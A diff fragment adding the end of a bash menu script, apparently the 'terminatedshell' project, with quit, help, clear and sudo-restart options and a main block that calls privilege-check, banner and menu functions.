+    0 | [Qq] | [Qq][Uu][Ii][Tt] | [Ee][Xx][Ii][Tt]) # --- About repo & exit ---
+        if command -v open > /dev/null; then 
+            echo -e "\n${RED}[!]${EOC} ${RED}Help us to improve & spread this script${EOC}\n" && \
+            sleep 1.5 && open https://github.com/anonimidin/terminatedshell | { echo -e "${RED}Failed to open github project in your ${RED}default browser${EOC}"; }
+        else
+            sleep 0.5
+            echo -e "${RED}[!]${EOC} ${RED}Help us to improve & spread this script (https://github.com/anonimidin/terminatedshell)${EOC}\n"
+        fi;;
+
+    "?" | [Hh] | [Hh][Ee][Ll][Pp]) # --- Show option based menu ---
+        sleep 0.5 && echo -e "$options" && menu;;
+
+    [Cc][Ll][Ss]|[Cc][Ll][Ee][Aa][Rr]) # --- Clear terminal --- 
+        sleep 0.3 && clear && menu;;
+    
+    [Rr][Oo][Oo][Tt])
+        sleep 1 && \
+        echo -e "${RED}[*]${EOC} Restarting script with ${RED}root privileges${EOC}..." \
+        clear && exec sudo -s $current_shell "$0"; ;;
+
+    *) echo -e "\n${RED}[!]${EOC} ${BOLD}Choose correct option.${EOC}\n" && menu;;
+    esac;
+}
+
+# ----- MAIN -----
+if (( $1 )) ; then
+    echo -e "\n${RED}[!] This script doesn't require any arguments${EOC}" && \
+    exit 1;
+else
+    priv_check || { 
+        echo -e "${RED}[x]${EOC} Failed to check ${RED}privilege${EOC} of current user ${RED}${USER}${EOC}" && \
+        exit 1; 
+    }
+    banner || { 
+        echo -e "${RED}[x]${EOC} Failed to display ${RED}banner${EOC}\n";
+    }
+    menu || { 
+        echo -e "${RED}[x]${EOC} Failed to start ${RED}menu${EOC}" && \
+        exit 1; 
+    }
+fi;
